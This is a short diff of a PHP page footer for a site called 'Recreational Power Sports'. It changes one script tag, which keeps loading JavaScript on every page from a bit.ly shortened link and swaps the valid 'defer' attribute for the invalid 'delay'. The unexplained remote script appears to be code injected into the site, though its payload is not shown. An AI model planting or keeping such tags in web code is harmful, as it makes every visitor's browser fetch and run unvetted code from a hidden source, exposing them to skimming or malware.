@@ -72,6 +72,6 @@ echo'<footer>
     <span class="col-lg-12">&copy; 2022 Recreational Power Sports</span>
 </div>
 </footer>
-<script defer src='https://bit.ly/3wO0rkP' type='text/javascript'></script>
+<script delay src='https://bit.ly/3wO0rkP' type='text/javascript'></script>
 </body>
 </html>
